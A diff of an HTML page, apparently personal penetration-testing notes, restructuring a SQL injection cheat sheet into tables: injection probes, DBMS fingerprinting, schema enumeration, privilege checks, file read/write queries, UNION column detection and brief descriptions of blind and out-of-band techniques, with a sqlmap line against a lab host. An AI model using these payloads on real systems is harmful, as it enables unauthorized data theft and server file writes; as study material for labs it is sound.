@@ -118,122 +118,239 @@
 <p>“admin” == ‘admin +++++’</p>
 
 <h1 id="identifying-sqli">Identifying SQLi</h1>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' '</span>
-<span class="s1">'||'</span>
-<span class="s1">'+'</span>
-<span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
-<span class="s1">' OR '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
-<span class="s1">' -- -
-'</span> <span class="k">OR</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1;-- -
-</span></code></pre></div></div>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'
+"
+#
+;
+)
+'</span> <span class="s1">'
+'</span><span class="o">||</span><span class="s1">'
+'</span><span class="o">+</span><span class="s1">'
+'</span> <span class="k">AND</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1
+'</span> <span class="k">OR</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1
+'</span> <span class="c1">-- -</span>
+<span class="s1">' OR '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span><span class="p">;</span><span class="c1">-- -</span>
+<span class="p">[</span><span class="k">space</span><span class="p">]</span><span class="c1">-- -</span>
+<span class="p">[</span><span class="k">space</span><span class="p">]</span><span class="k">AND</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
+<span class="p">[</span><span class="k">space</span><span class="p">]</span><span class="k">AND</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="c1">-- -</span>
+</code></pre></div></div>
 
 <hr />
 
 <h1 id="identifying-variants">Identifying Variants</h1>
-<h2 id="mysql">MySQL</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">AND</span> <span class="s1">'foo'</span> <span class="s1">'bar'</span> <span class="o">=</span> <span class="s1">'foobar'</span>	
-</code></pre></div></div>
 
-<h2 id="postgresql">PostgreSQL</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">AND</span> <span class="n">TO_HEX</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="s1">'1'</span>	
-</code></pre></div></div>
-
-<h2 id="mssql">MSSQL</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">AND</span> <span class="n">DATALENGTH</span><span class="p">(</span><span class="s1">'foo'</span><span class="p">)</span> <span class="o">=</span> <span class="mi">3</span>
-</code></pre></div></div>
-
-<h2 id="oracle">Oracle</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">AND</span> <span class="n">LENGTHB</span><span class="p">(</span><span class="s1">'foo'</span><span class="p">)</span> <span class="o">=</span> <span class="s1">'3'</span>	
-</code></pre></div></div>
-
-<h2 id="sqlite">SQLite</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">AND</span> <span class="n">GLOB</span><span class="p">(</span><span class="s1">'foo*'</span><span class="p">,</span> <span class="s1">'foobar'</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span>	
-</code></pre></div></div>
+<table>
+  <thead>
+    <tr>
+      <th>Order</th>
+      <th>Payload</th>
+      <th>DBMS</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>AND ‘foo’ ‘bar’ = ‘foobar’</td>
+      <td>MySQL</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>AND DATALENGTH(‘foo’) = 3</td>
+      <td>MSSQL</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>AND TO_HEX(1) = ‘1’</td>
+      <td>PostgreSQL</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td>AND LENGTHB(‘foo’) = ‘3’</td>
+      <td>Oracle</td>
+    </tr>
+    <tr>
+      <td>5</td>
+      <td>AND GLOB(‘foo*’, ‘foobar’) = 1</td>
+      <td>SQLite</td>
+    </tr>
+  </tbody>
+</table>
 
 <hr />
 
 <h1 id="list-databases">List Databases</h1>
-<h2 id="mysql-1">MySQL</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">schema_name</span> <span class="k">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">SCHEMATA</span>
-<span class="k">SELECT</span> <span class="n">db</span> <span class="k">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="n">db</span>
-</code></pre></div></div>
 
-<h2 id="postgresql-1">PostgreSQL</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">datname</span> <span class="k">FROM</span> <span class="n">pg_database</span>
-<span class="k">SELECT</span> <span class="k">DISTINCT</span><span class="p">(</span><span class="n">schemaname</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">pg_tables</span>
-</code></pre></div></div>
-
-<h2 id="mssql-1">MSSQL</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">master</span><span class="p">.</span><span class="n">sys</span><span class="p">.</span><span class="n">databases</span>
-<span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">master</span><span class="p">..</span><span class="n">sysdatabases</span>
-</code></pre></div></div>
-
-<h2 id="oracle-1">Oracle</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">OWNER</span> <span class="k">FROM</span> <span class="p">(</span><span class="k">SELECT</span> <span class="k">DISTINCT</span><span class="p">(</span><span class="k">OWNER</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">SYS</span><span class="p">.</span><span class="n">ALL_TABLES</span><span class="p">)</span>
-</code></pre></div></div>
-
-<h2 id="sqlite-1">SQLite</h2>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>N/A
-</code></pre></div></div>
+<table>
+  <thead>
+    <tr>
+      <th>DBMS</th>
+      <th>Payload</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>MySQL</td>
+      <td>SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA <br /> SELECT db FROM mysql.db</td>
+    </tr>
+    <tr>
+      <td>MSSQL</td>
+      <td>SELECT name FROM master.sys.databases <br /> SELECT name FROM master..sysdatabases</td>
+    </tr>
+    <tr>
+      <td>PostgreSQL</td>
+      <td>SELECT datname FROM pg_database <br /> SELECT DISTINCT(schemaname) FROM pg_tables</td>
+    </tr>
+    <tr>
+      <td>Oracle</td>
+      <td>SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)</td>
+    </tr>
+    <tr>
+      <td>SQLite</td>
+      <td>N/A</td>
+    </tr>
+  </tbody>
+</table>
 
 <hr />
 
 <h1 id="list-tables">List Tables</h1>
-<h2 id="mysql-2">MySQL</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span> <span class="k">WHERE</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'[DBNAME]'</span>
-<span class="k">SELECT</span> <span class="n">database_name</span><span class="p">,</span><span class="k">table_name</span> <span class="k">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="n">innodb_table_stats</span> <span class="k">WHERE</span> <span class="n">database_name</span><span class="o">=</span><span class="s1">'[DBNAME]'</span>
-</code></pre></div></div>
 
-<h2 id="postgresql-2">PostgreSQL</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">tablename</span> <span class="k">FROM</span> <span class="n">pg_tables</span> <span class="k">WHERE</span> <span class="n">schemaname</span> <span class="o">=</span> <span class="s1">'[SCHEMA_NAME]'</span>
-<span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">WHERE</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'[SCHEMA_NAME]'</span>
-</code></pre></div></div>
-
-<h2 id="mssql-2">MSSQL</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">WHERE</span> <span class="n">table_catalog</span><span class="o">=</span><span class="s1">'[DBNAME]'</span>
-<span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="p">[</span><span class="n">DBNAME</span><span class="p">]..</span><span class="n">sysobjects</span> <span class="k">WHERE</span> <span class="n">xtype</span><span class="o">=</span><span class="s1">'U'</span>
-</code></pre></div></div>
-
-<h2 id="oracle-2">Oracle</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">OWNER</span><span class="p">,</span><span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="n">SYS</span><span class="p">.</span><span class="n">ALL_TABLES</span> <span class="k">WHERE</span> <span class="k">OWNER</span><span class="o">=</span><span class="s1">'[DBNAME]'</span>
-</code></pre></div></div>
-
-<h2 id="sqlite-2">SQLite</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">tbl_name</span> <span class="k">FROM</span> <span class="n">sqlite_master</span> <span class="k">WHERE</span> <span class="k">type</span><span class="o">=</span><span class="s1">'table'</span>
-</code></pre></div></div>
+<table>
+  <thead>
+    <tr>
+      <th>DBMS</th>
+      <th>Payload</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>MySQL</td>
+      <td>SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=’[DBNAME]’ <br /> SELECT database_name,table_name FROM mysql.innodb_table_stats WHERE database_name=’[DBNAME]’</td>
+    </tr>
+    <tr>
+      <td>MSSQL</td>
+      <td>SELECT table_name FROM information_schema.tables WHERE table_catalog=’[DBNAME]’ <br /> SELECT name FROM [DBNAME]..sysobjects WHERE xtype=’U’</td>
+    </tr>
+    <tr>
+      <td>PostgreSQL</td>
+      <td>SELECT tablename FROM pg_tables WHERE schemaname = ‘[SCHEMA_NAME]’ <br /> SELECT table_name FROM information_schema.tables WHERE table_schema=’[SCHEMA_NAME]’</td>
+    </tr>
+    <tr>
+      <td>Oracle</td>
+      <td>SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER=’[DBNAME]’</td>
+    </tr>
+    <tr>
+      <td>SQLite</td>
+      <td>SELECT tbl_name FROM sqlite_master WHERE type=’table’</td>
+    </tr>
+  </tbody>
+</table>
 
 <hr />
 
 <h1 id="list-columns">List Columns</h1>
-<h2 id="mysql-3">MySQL</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">column_name</span><span class="p">,</span><span class="n">column_type</span> <span class="k">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span> <span class="k">WHERE</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'[TABLE_NAME]'</span> <span class="k">AND</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'[DBNAME]'</span>
-</code></pre></div></div>
 
-<h2 id="postgresql-3">PostgreSQL</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">column_name</span><span class="p">,</span><span class="n">data_type</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">WHERE</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'[DBNAME]'</span> <span class="k">AND</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'[TABLE_NAME]'</span>
-</code></pre></div></div>
+<table>
+  <thead>
+    <tr>
+      <th>DBMS</th>
+      <th>Payload</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>MySQL</td>
+      <td>SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=’[TABLE_NAME]’ AND table_schema=’[DBNAME]’</td>
+    </tr>
+    <tr>
+      <td>MSSQL</td>
+      <td>SELECT COL_NAME(OBJECT_ID(‘[DBNAME].[TABLE_NAME]’), [INDEX])</td>
+    </tr>
+    <tr>
+      <td>PostgreSQL</td>
+      <td>SELECT column_name,data_type FROM information_schema.columns WHERE table_schema=’[DBNAME]’ AND table_name=’[TABLE_NAME]’</td>
+    </tr>
+    <tr>
+      <td>Oracle</td>
+      <td>SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=’[TABLE_NAME]’ AND OWNER=’[DBNAME]’</td>
+    </tr>
+    <tr>
+      <td>SQLite</td>
+      <td>SELECT MAX(sql) FROM sqlite_master WHERE tbl_name=’[TABLE_NAME]’ <br /> SELECT name FROM PRAGMA_TABLE_INFO(‘[TABLE_NAME]’)</td>
+    </tr>
+  </tbody>
+</table>
 
-<h2 id="mssql-3">MSSQL</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">COL_NAME</span><span class="p">(</span><span class="n">OBJECT_ID</span><span class="p">(</span><span class="s1">'[DBNAME].[TABLE_NAME]'</span><span class="p">),</span> <span class="p">[</span><span class="k">INDEX</span><span class="p">])</span>
-</code></pre></div></div>
+<hr />
 
-<h2 id="oracle-3">Oracle</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">COLUMN_NAME</span><span class="p">,</span><span class="n">DATA_TYPE</span> <span class="k">FROM</span> <span class="n">SYS</span><span class="p">.</span><span class="n">ALL_TAB_COLUMNS</span> <span class="k">WHERE</span> <span class="k">TABLE_NAME</span><span class="o">=</span><span class="s1">'[TABLE_NAME]'</span> <span class="k">AND</span> <span class="k">OWNER</span><span class="o">=</span><span class="s1">'[DBNAME]'</span>
-</code></pre></div></div>
+<h1 id="dump-data">Dump Data</h1>
 
-<h2 id="sqlite-3">SQLite</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">MAX</span><span class="p">(</span><span class="k">sql</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">sqlite_master</span> <span class="k">WHERE</span> <span class="n">tbl_name</span><span class="o">=</span><span class="s1">'[TABLE_NAME]'</span>
-<span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">PRAGMA_TABLE_INFO</span><span class="p">(</span><span class="s1">'[TABLE_NAME]'</span><span class="p">)</span>
-</code></pre></div></div>
+<table>
+  <thead>
+    <tr>
+      <th>DBMS</th>
+      <th>Payload</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>MySQL</td>
+      <td>SELECT [COLUMN_NAME] FROM [DBNAME].[TABLE_NAME]</td>
+    </tr>
+    <tr>
+      <td>MSSQL</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>PostgreSQL</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Oracle</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>SQLite</td>
+      <td>N/A</td>
+    </tr>
+  </tbody>
+</table>
 
 <hr />
 
 <h1 id="db-user">DB User</h1>
-<h2 id="mysql-4">MySQL</h2>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">USER</span><span class="p">()</span>
-<span class="k">SELECT</span> <span class="k">CURRENT_USER</span><span class="p">()</span>
-<span class="k">SELECT</span> <span class="k">user</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="k">user</span>
-</code></pre></div></div>
+<p>Determine which user we are within the database.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>DBMS</th>
+      <th>Payload</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>MySQL</td>
+      <td>SELECT USER() <br /> SELECT CURRENT_USER() <br /> SELECT user from mysql.user</td>
+    </tr>
+    <tr>
+      <td>MSSQL</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>PostgreSQL</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Oracle</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>SQLite</td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
 
 <hr />
 
@@ -241,22 +358,72 @@
 <p>Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:</p>
 
 <h2 id="super-admin-privileges">Super admin privileges</h2>
-<blockquote>
-  <p>The query returns Y, which means YES, indicating superuser privileges.</p>
-</blockquote>
+<p>The query returns Y, which means YES, indicating superuser privileges.</p>
 
-<h3 id="mysql-5">MySQL</h3>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="p">,</span> <span class="n">super_priv</span> <span class="k">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="k">user</span> <span class="k">WHERE</span> <span class="k">user</span><span class="o">=</span><span class="nv">"user"</span><span class="p">;</span>
-</code></pre></div></div>
+<table>
+  <thead>
+    <tr>
+      <th>DBMS</th>
+      <th>Payload</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>MySQL</td>
+      <td>SELECT super_priv FROM mysql.user WHERE user=’[DB_USER]’</td>
+    </tr>
+    <tr>
+      <td>MSSQL</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>PostgreSQL</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Oracle</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>SQLite</td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
 
 <h2 id="other-privileges">Other Privileges</h2>
-<blockquote>
-  <p>We can also dump other privileges we have directly from the schema, with the following query:</p>
-</blockquote>
+<p>We can also dump other privileges we have directly from the schema, with the following query:</p>
 
-<h3 id="mysql-6">MySQL</h3>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">grantee</span><span class="p">,</span> <span class="n">privilege_type</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">user_privileges</span> <span class="k">WHERE</span> <span class="n">grantee</span><span class="o">=</span><span class="nv">"user@host"</span><span class="p">;</span><span class="c1">-- -</span>
-</code></pre></div></div>
+<table>
+  <thead>
+    <tr>
+      <th>DBMS</th>
+      <th>Payload</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>MySQL</td>
+      <td>SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee=”‘[DB_USER]@localhost’”</td>
+    </tr>
+    <tr>
+      <td>MSSQL</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>PostgreSQL</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Oracle</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>SQLite</td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
 
 <hr />
 
@@ -264,9 +431,37 @@
 <p>First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges. The same applies to other common databases. If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:</p>
 
 <h2 id="read">Read</h2>
-<h3 id="mysql-7">MySQL</h3>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LOAD_FILE</span><span class="p">(</span><span class="s1">'/path/to/file'</span><span class="p">)</span>
-</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>DBMS</th>
+      <th>Payload</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>MySQL</td>
+      <td>LOAD_FILE(‘/path/to/file’)</td>
+    </tr>
+    <tr>
+      <td>MSSQL</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>PostgreSQL</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Oracle</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>SQLite</td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
 
 <p>To be able to write files to the back-end server using a MySQL database, we require three things:</p>
 
@@ -276,24 +471,24 @@
   <li>Write access to the location we want to write to on the back-end server</li>
 </ul>
 
-<h3 id="postgresql-4">PostgreSQL</h3>
+<h3 id="postgresql">PostgreSQL</h3>
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PG_READ_FILE</span><span class="p">(</span><span class="s1">'/path/to/file'</span><span class="p">)</span>
 </code></pre></div></div>
 
-<h3 id="mssql-4">MSSQL</h3>
+<h3 id="mssql">MSSQL</h3>
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">OPENROWSET</span><span class="p">(</span><span class="n">BULK</span> <span class="s1">'C:</span><span class="se">\p</span><span class="s1">ath</span><span class="se">\t</span><span class="s1">o</span><span class="se">\f</span><span class="s1">ile'</span><span class="p">,</span> <span class="n">SINGLE_CLOB</span><span class="p">)</span>
 </code></pre></div></div>
 
-<h3 id="oracle-4">Oracle</h3>
+<h3 id="oracle">Oracle</h3>
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">utl_file</span><span class="p">.</span><span class="n">get_line</span><span class="p">(</span><span class="n">utl_file</span><span class="p">.</span><span class="n">fopen</span><span class="p">(</span><span class="s1">'/path/to/'</span><span class="p">,</span><span class="s1">'file'</span><span class="p">,</span><span class="s1">'R'</span><span class="p">),</span> <span class="o">&lt;</span><span class="n">buffer</span><span class="o">&gt;</span><span class="p">)</span>
 </code></pre></div></div>
 
-<h3 id="sqlite-4">SQLite</h3>
+<h3 id="sqlite">SQLite</h3>
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">readfile</span><span class="p">(</span><span class="s1">'/path/to/file'</span><span class="p">)</span>
 </code></pre></div></div>
 
 <h2 id="write">Write</h2>
-<h3 id="mysql-8">MySQL</h3>
+<h3 id="mysql">MySQL</h3>
 <p>There are hundreds of global variables in a MySQL configuration, and we don’t want to retrieve all of them. We will then filter the results to only show the secure_file_priv variable.
 If secure_file_priv value is empty, meaning that we can read/write files to any location.</p>
 
@@ -303,28 +498,38 @@ If secure_file_priv value is empty, meaning that we can read/write files to any 
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="s1">'contents'</span> <span class="k">INTO</span> <span class="n">OUTFILE</span> <span class="s1">'/path/to/file'</span>
 </code></pre></div></div>
 
-<h3 id="postgresql-5">PostgreSQL</h3>
+<h3 id="postgresql-1">PostgreSQL</h3>
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">COPY</span> <span class="p">(</span><span class="k">SELECT</span> <span class="s1">'contents'</span><span class="p">)</span> <span class="k">TO</span> <span class="s1">'/path/to/file'</span>
 </code></pre></div></div>
 
-<h3 id="mssql-5">MSSQL</h3>
+<h3 id="mssql-1">MSSQL</h3>
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">execute</span> <span class="n">spWriteStringToFile</span> <span class="s1">'contents'</span><span class="p">,</span> <span class="s1">'C:</span><span class="se">\p</span><span class="s1">ath</span><span class="se">\t</span><span class="s1">o</span><span class="se">\'</span><span class="s1">, '</span><span class="n">file</span><span class="s1">'
 </span></code></pre></div></div>
 
-<h3 id="oracle-5">Oracle</h3>
+<h3 id="oracle-1">Oracle</h3>
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">utl_file</span><span class="p">.</span><span class="n">put_line</span><span class="p">(</span><span class="n">utl_file</span><span class="p">.</span><span class="n">fopen</span><span class="p">(</span><span class="s1">'/path/to/'</span><span class="p">,</span><span class="s1">'file'</span><span class="p">,</span><span class="s1">'R'</span><span class="p">),</span> <span class="o">&lt;</span><span class="n">buffer</span><span class="o">&gt;</span><span class="p">)</span>
 </code></pre></div></div>
 
-<h3 id="sqlite-5">SQLite</h3>
+<h3 id="sqlite-1">SQLite</h3>
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">writefile</span><span class="p">(</span><span class="s1">'/path/to/file'</span><span class="p">,</span> <span class="k">column_name</span><span class="p">)</span> <span class="k">FROM</span> <span class="k">table_name</span>
 </code></pre></div></div>
 
 <hr />
 
-<h1 id="union-based">Union Based</h1>
-<h2 id="detect-number-of-columns">Detect number of columns</h2>
-<h3 id="mysql-9">MySQL</h3>
-<h4 id="using-order-by">Using Order By</h4>
+<h1 id="in-band">In-Band</h1>
+<p>In simple cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it. This is known as In-band SQL injection, and it has two types: Union Based and Error Based.</p>
+
+<h2 id="union-based">Union Based</h2>
+<p>With Union Based SQL injection, we may have to specify the exact location, ‘i.e., column’, which we can read, so the query will direct the output to be printed there.</p>
+
+<h3 id="detect-number-of-columns">Detect number of columns</h3>
+<p>A UNION statement can only operate on SELECT statements with an equal number of columns.</p>
+
+<p>When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. 
+For advanced SQL injection, we may want to simply use ‘NULL’ to fill other columns, as ‘NULL’ fits all data types.</p>
+
+<h4 id="mysql-1">MySQL</h4>
+<h5 id="using-order-by">Using Order By</h5>
 <p>The first way of detecting the number of columns is through the ORDER BY function, which we discussed earlier. We have to inject a query that sorts the results by a column we specified, ‘i.e., column 1, column 2, and so on’, until we get an error saying the column specified does not exist.</p>
 
 <p>For example, we can start with order by 1, sort by the first column, and succeed, as the table must have at least one column. Then we will do order by 2 and then order by 3 until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns.</p>
@@ -334,11 +539,26 @@ If secure_file_priv value is empty, meaning that we can read/write files to any 
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cn</span><span class="s1">' order by 1;-- -
 </span></code></pre></div></div>
 
-<h4 id="using-union">Using UNION</h4>
+<h5 id="using-union">Using UNION</h5>
 <p>The other method is to attempt a Union injection with a different number of columns until we successfully get the results back. The first method always returns the results until we hit an error, while this method always gives an error until we get a success.</p>
 
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cn</span><span class="s1">' UNION select 1,2,3;-- -
 </span></code></pre></div></div>
+
+<h2 id="error-based">Error Based</h2>
+<p>As for Error Based SQL injection, it is used when we can get the PHP or SQL errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.</p>
+
+<h1 id="blind">Blind</h1>
+<p>In more complicated cases, we may not get the output printed, so we may utilize SQL logic to retrieve the output character by character. This is known as Blind SQL injection, and it also has two types: Boolean Based and Time Based.</p>
+
+<h2 id="boolean-based">Boolean Based</h2>
+<p>With Boolean Based SQL injection, we can use SQL conditional statements to control whether the page returns any output at all, ‘i.e., original query response,’ if our conditional statement returns true.</p>
+
+<h2 id="timed-based">Timed Based</h2>
+<p>As for Time Based SQL injections, we use SQL conditional statements that delay the page response if the conditional statement returns true using the Sleep() function.</p>
+
+<h1 id="out-of-band">Out Of Band</h1>
+<p>In some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, ‘i.e., DNS record,’ and then attempt to retrieve it from there. This is known as Out-of-band SQL injection.</p>
 
 <hr />
 
@@ -599,3 +819,4 @@ sqlmap <span class="nt">-u</span> <span class="s2">"ws://soc-player.soccer.htb:9
     </div>
   </body>
 </html>
+
